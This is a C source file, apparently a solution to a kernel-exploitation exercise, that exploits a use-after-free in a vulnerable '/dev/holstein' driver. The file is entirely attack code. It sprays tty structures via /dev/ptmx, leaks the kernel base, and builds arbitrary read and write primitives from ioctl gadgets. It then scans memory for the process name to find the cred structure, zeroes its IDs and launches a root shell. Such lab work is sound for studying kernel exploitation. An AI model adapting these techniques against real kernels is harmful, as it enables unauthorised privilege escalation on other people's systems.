#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)
#define inc idx++
#define save_state(val)                                   \
    do {                                                  \
        __asm__(                                          \
            ".intel_syntax noprefix;"                     \
            "mov user_cs, cs;"                            \
            "mov user_ss, ss;"                            \
            "mov user_rsp, rsp;"                          \
            "mov user_rbp, rbp;" /*this to make sure stack frame doesnt corrupted*/ \
            "pushfq;"                                     \
            "pop user_rflags;"                            \
            ".att_syntax;"                                \
        );                                                \
        user_rip = val;                                   \
        puts("[$] saved state");                          \
    } while (0)

typedef uint64_t u64;
typedef uint32_t u32;

u64 fd1, fd2, fd3, fd4;
u64 spray[205];
u64 user_rip, user_cs, user_rflags, user_rsp, user_ss, user_rbp;
u64 kbase, g_buf, koffset;
char buf[0x505]; // declaration in global to prevent bad coding pratice (etc, forget to rewrite struct metadata value when heap overflow)
u64 mov_eax_ptr_rdx_ret, mov_ptr_rdx_rcx_ret, cred_addr;
u64 cachefd = -1; // stored victim spray[i] to boost arb read speed

void win()
{
    if(getuid() == 0)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        puts("[*] enjoy");
        execve(argv[0], argv, envp);
    }
    else puts("[!] fail uid");
}

void aaw32(u64 addr, u32 val)
{
    /* no need to prepare gadget since we already did */
    // trigger
    for_x(i, 0, 99) ioctl(spray[i], val /* rcx */, addr /* rdx */);
}

u32 aar32(u64 addr)
{
    /* no need to prepare gadget since we already did */
    // trigger
     if(cachefd != -1) return ioctl(cachefd, 0, addr /* rdx */);
    u32 retval;
    for_x(i, 100, 199) 
    {
        retval = ioctl(spray[i], 0, addr /* rdx */);
        if(retval != -1) 
        {
            cachefd = spray[i];
            return retval;
        }
    }
}

int main()
{
    // uaf + heap spray
    fd1 = open("/dev/holstein", O_RDWR);
    fd2 = open("/dev/holstein", O_RDWR);
    close(fd1);
    for_x(i, 0, 99) spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);

    // leak kbase and g_buf (fd2's g_buf)
    read(fd2, buf, 0x400);
    kbase = *(u64 *)(&buf[0x248]) - 0x31b3e0;
    g_buf = *(u64 *)(&buf[0x38]) - 0x38;
    printf("[*] kbase: 0x%lx\n", kbase);
    printf("[*] g_buf: 0x%lx\n", g_buf);

    koffset = kbase - 0xffffffff81000000;
    printf("[?] koffset: 0x%lx\n", koffset);
    mov_eax_ptr_rdx_ret = koffset + 0xffffffff8103403c;
    mov_ptr_rdx_rcx_ret = koffset + 0xffffffff81048687;

    // heap fengshui to prepare aaw32 primitive
    *(u64 *)(&buf[0x3f8]) = mov_ptr_rdx_rcx_ret;
    *(u64 *)(&buf[0x18]) = (g_buf + 0x3f8) - (0xc * 8); // padding the for the gadget at offset 0xc
    write(fd2, buf, 0x400);
    
    // heap spray + fengshui to prepare aar32 primitive
    fd3 = open("/dev/holstein", O_RDWR);
    fd4 = open("/dev/holstein", O_RDWR);
    close(fd3);
    for_x(i, 100, 199) spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    read(fd4, buf, 0x400); // restore tty metadata value and find fd4's g_buf (its different with g_buf which is fd2's g_buf)
    u64 fd4_gbuf = *(u64 *)(&buf[0x38]) - 0x38;
    *(u64 *)(&buf[0x3f8]) = mov_eax_ptr_rdx_ret;
    *(u64 *)(&buf[0x18]) = (fd4_gbuf + 0x3f8) - (0xc * 8); // padding the for the gadget at offset 0xc
    write(fd4, buf, 0x400);
    
    // find commit_creds addr
    prctl(PR_SET_NAME, "vanished"); // 76 61 6e 69 73 68 65 64
    u64 comm_addr;
    for(u64 addr = g_buf - 0x1000000; ; addr += 8)
    {
        if((addr & 0xfffff) == 0) printf("[?] finding comm array at: 0x%lx\n", addr);
        if(aar32(addr) == 0x696e6176 && aar32(addr + 4) == 0x64656873)
        {
            comm_addr = addr;
            printf("[*] found comm array at: 0x%lx\n", comm_addr);
            break;
        }
    }
    cred_addr = (((u64)aar32(comm_addr - 4)) << 32) + (aar32(comm_addr - 8));
    printf("[*] cred_addr: 0x%lx\n", cred_addr);
    
    // overwrite cred structure
    puts("[*] overwrite cred struct");
    for_x(i, 1, 8) aaw32(cred_addr + i * 4, 0);

    // get root shell
    win();
    
    // clean up fd
    close(fd2);
    close(fd4);
    for_x(i, 0, 99) close(spray[i]);
}